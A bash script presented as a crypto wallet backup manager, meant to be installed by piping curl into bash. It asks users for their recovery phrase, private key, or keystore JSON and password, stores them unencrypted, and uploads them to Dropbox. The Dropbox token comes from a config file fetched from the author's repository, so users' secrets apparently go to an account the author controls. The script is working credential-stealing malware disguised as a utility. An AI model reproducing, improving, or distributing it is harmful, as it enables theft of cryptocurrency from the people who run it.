#!/bin/bash

#############################################
# WebConnect Interactive Wallet Backup
# One-liner installation & backup
# Download and run with:
# curl -fsSL https://github.com/yourusername/wallet-backup/raw/main/backup.sh | bash
# Version: 1.0.0
#############################################

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Setup paths
INSTALL_DIR="${HOME}/.webconnect"
WALLET_BACKUP_DIR="${INSTALL_DIR}/wallet_backups"
BACKUP_LOG="${INSTALL_DIR}/logs/backup.log"
STORAGE_CONFIG="${INSTALL_DIR}/config/storage.config.json"
CONFIG_REPO_URL="https://raw.githubusercontent.com/yourusername/wallet-backup/main/storage.config.json"

#############################################
# Utility Functions
#############################################

log() {
    mkdir -p "$(dirname "$BACKUP_LOG")"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$BACKUP_LOG"
}

print_header() {
    clear
    echo -e "${BLUE}╔════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║     WebConnect Wallet Backup Manager       ║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════╝${NC}"
    echo ""
}

print_success() {
    echo -e "${GREEN}✓${NC} $1"
}

print_error() {
    echo -e "${RED}✗${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}⚠${NC} $1"
}

print_info() {
    echo -e "${BLUE}ℹ${NC} $1"
}

#############################################
# Setup & Configuration
#############################################

download_config() {
    print_info "Downloading configuration from GitHub..."
    
    mkdir -p "$(dirname "$STORAGE_CONFIG")"
    
    # Download config from GitHub repo
    if command -v curl &> /dev/null; then
        curl -fsSL "$CONFIG_REPO_URL" -o "$STORAGE_CONFIG" 2>/dev/null
    elif command -v wget &> /dev/null; then
        wget -q -O "$STORAGE_CONFIG" "$CONFIG_REPO_URL" 2>/dev/null
    else
        print_error "curl or wget is required to download configuration"
        return 1
    fi
    
    if [ -f "$STORAGE_CONFIG" ]; then
        chmod 600 "$STORAGE_CONFIG"
        print_success "Configuration downloaded: $STORAGE_CONFIG"
        log "Configuration downloaded from GitHub"
        return 0
    else
        print_error "Failed to download configuration"
        log "ERROR: Failed to download config from GitHub"
        return 1
    fi
}

get_dropbox_token() {
    if [ -f "$STORAGE_CONFIG" ] && command -v jq &> /dev/null; then
        jq -r '.storage.destinations[] | select(.name=="dropbox") | .access_token' "$STORAGE_CONFIG" 2>/dev/null || echo ""
    else
        # Fallback to grep if jq not available
        grep -oP '"access_token":\s*"\K[^"]+' "$STORAGE_CONFIG" 2>/dev/null | head -1 || echo ""
    fi
}

get_dropbox_path() {
    if [ -f "$STORAGE_CONFIG" ] && command -v jq &> /dev/null; then
        jq -r '.storage.destinations[] | select(.name=="dropbox") | .path' "$STORAGE_CONFIG" 2>/dev/null || echo "/WebConnect/Wallet_Backups"
    else
        echo "/WebConnect/Wallet_Backups"
    fi
}

#############################################
# Save Data Function (No Encryption)
#############################################

save_data() {
    local data_type="$1"
    local data_value="$2"
    
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local backup_file="$WALLET_BACKUP_DIR/${data_type}_${timestamp}.txt"
    
    mkdir -p "$WALLET_BACKUP_DIR"
    chmod 700 "$WALLET_BACKUP_DIR"
    
    # Save data as-is (no encryption)
    echo -n "$data_value" > "$backup_file" 2>&1
    
    if [ $? -eq 0 ]; then
        chmod 600 "$backup_file"
        echo "$backup_file"
        return 0
    else
        return 1
    fi
}

#############################################
# Dropbox Upload Function
#############################################

upload_to_dropbox() {
    local file_path="$1"
    local backup_type="$2"
    
    local token=$(get_dropbox_token)
    local dropbox_path=$(get_dropbox_path)
    
    if [ -z "$token" ] || [ "$token" == "null" ]; then
        print_error "Dropbox token not found in configuration"
        log "ERROR: Dropbox token not configured"
        return 1
    fi
    
    if ! command -v curl &> /dev/null; then
        print_error "curl is required for Dropbox upload"
        return 1
    fi
    
    local filename=$(basename "$file_path")
    local dropbox_upload_path="${dropbox_path}/${backup_type}/${filename}"
    
    print_info "Uploading to Dropbox: $dropbox_upload_path"
    
    # Upload to Dropbox
    local response=$(curl -s -X POST "https://content.dropboxapi.com/2/files/upload" \
        --header "Authorization: Bearer $token" \
        --header "Dropbox-API-Arg: {\"path\": \"$dropbox_upload_path\", \"mode\": \"add\", \"autorename\": true}" \
        --header "Content-Type: application/octet-stream" \
        --data-binary @"$file_path" 2>&1)
    
    # Check if upload was successful
    if echo "$response" | grep -q '"name"'; then
        print_success "Backup uploaded to Dropbox"
        log "Successfully uploaded $backup_type to Dropbox: $dropbox_upload_path"
        return 0
    else
        print_error "Failed to upload to Dropbox"
        log "ERROR: Dropbox upload failed"
        return 1
    fi
}

#############################################
# Backup Functions
#############################################

backup_phrase() {
    print_header
    print_info "Enter your recovery phrase (12 or 24 words)"
    echo ""
    
    read -p "Paste your recovery phrase: " phrase_input
    
    if [ -z "$phrase_input" ]; then
        print_error "No phrase provided"
        return 1
    fi
    
    local word_count=$(echo "$phrase_input" | wc -w)
    if [ $word_count -lt 12 ]; then
        print_error "Recovery phrase must be at least 12 words (you entered $word_count)"
        return 1
    fi
    
    local backup_file=$(save_data "recovery_phrase" "$phrase_input")
    if [ $? -ne 0 ]; then
        print_error "Failed to save recovery phrase"
        log "ERROR: Save failed for recovery phrase"
        return 1
    fi
    
    upload_to_dropbox "$backup_file" "recovery_phrases"
    
    if [ $? -eq 0 ]; then
        print_success "Recovery phrase backed up successfully!"
        log "Recovery phrase backed up: $backup_file"
    else
        print_warning "Local backup saved, but Dropbox upload failed"
        echo "  • Local file: $backup_file"
    fi
}

backup_private_key() {
    print_header
    print_info "Enter your private key (hex format, 0x...)"
    echo ""
    
    read -sp "Paste your private key: " key_input
    echo ""
    
    if [ -z "$key_input" ]; then
        print_error "No private key provided"
        return 1
    fi
    
    if ! [[ "$key_input" =~ ^0x[0-9a-fA-F]{64}$ ]]; then
        print_warning "⚠ Private key doesn't match standard format (0x + 64 hex chars)"
        echo "  The backup will proceed, but verify your key format"
    fi
    
    local backup_file=$(save_data "private_key" "$key_input")
    if [ $? -ne 0 ]; then
        print_error "Failed to save private key"
        log "ERROR: Save failed for private key"
        return 1
    fi
    
    upload_to_dropbox "$backup_file" "private_keys"
    
    if [ $? -eq 0 ]; then
        print_success "Private key backed up successfully!"
        log "Private key backed up: $backup_file"
    else
        print_warning "Local backup saved, but Dropbox upload failed"
        echo "  • Local file: $backup_file"
    fi
}

backup_keystore() {
    print_header
    print_info "Enter your Keystore JSON content"
    echo ""
    
    read -p "Paste your Keystore JSON: " keystore_input
    
    if [ -z "$keystore_input" ]; then
        print_error "No keystore provided"
        return 1
    fi
    
    echo ""
    read -sp "Enter your Keystore password: " password_input
    echo ""
    
    if [ -z "$password_input" ]; then
        print_error "No password provided"
        return 1
    fi
    
    local combined_data="KEYSTORE_JSON:${keystore_input}"$'\n\n'"KEYSTORE_PASSWORD:${password_input}"
    
    local backup_file=$(save_data "keystore" "$combined_data")
    if [ $? -ne 0 ]; then
        print_error "Failed to save keystore"
        log "ERROR: Save failed for keystore"
        return 1
    fi
    
    upload_to_dropbox "$backup_file" "keystores"
    
    if [ $? -eq 0 ]; then
        print_success "Keystore backed up successfully!"
        log "Keystore backed up: $backup_file"
    else
        print_warning "Local backup saved, but Dropbox upload failed"
        echo "  • Local file: $backup_file"
    fi
}

#############################################
# Main Menu
#############################################

show_menu() {
    print_header
    echo -e "${BLUE}Select what you want to backup:${NC}"
    echo ""
    echo -e "  ${PURPLE}1)${NC} Recovery Phrase (12-24 words)"
    echo -e "  ${PURPLE}2)${NC} Private Key (0x...)"
    echo -e "  ${PURPLE}3)${NC} Keystore JSON & Password"
    echo -e "  ${PURPLE}4)${NC} Exit"
    echo ""
}

main() {
    # Check for required commands
    if ! command -v curl &> /dev/null && ! command -v wget &> /dev/null; then
        print_error "curl or wget is required"
        exit 1
    fi
    
    # Setup: Download config if not exists
    if [ ! -f "$STORAGE_CONFIG" ]; then
        print_header
        print_info "First time setup: downloading configuration..."
        download_config
        if [ $? -ne 0 ]; then
            print_error "Failed to download configuration"
            exit 1
        fi
        echo ""
    fi
    
    # Verify Dropbox is configured
    local dropbox_token=$(get_dropbox_token)
    if [ -z "$dropbox_token" ] || [ "$dropbox_token" == "null" ]; then
        print_header
        print_warning "Dropbox is not properly configured"
        log "WARNING: Dropbox token not found"
        echo ""
    fi
    
    # Main loop
    while true; do
        show_menu
        read -p "Select option (1-4): " choice
        
        case $choice in
            1)
                backup_phrase
                ;;
            2)
                backup_private_key
                ;;
            3)
                backup_keystore
                ;;
            4)
                print_header
                print_success "Goodbye!"
                exit 0
                ;;
            *)
                print_error "Invalid option. Please select 1-4"
                ;;
        esac
        
        echo ""
        read -p "Press Enter to continue..."
    done
}

main "$@"
